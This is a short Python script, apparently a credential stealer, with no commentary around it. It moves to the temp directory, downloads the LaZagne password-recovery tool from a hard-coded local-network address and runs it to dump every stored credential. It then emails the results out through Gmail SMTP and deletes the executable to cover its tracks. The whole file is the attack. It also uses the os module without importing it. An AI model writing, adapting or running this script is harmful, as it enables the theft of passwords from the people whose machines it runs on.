import requests, subprocess, smtplib, re, tempfile

def download_url(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download_url("http://192.168.0.108/Files/lazagne.exe")
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("", "", result)
os.remove("laZagne.exe")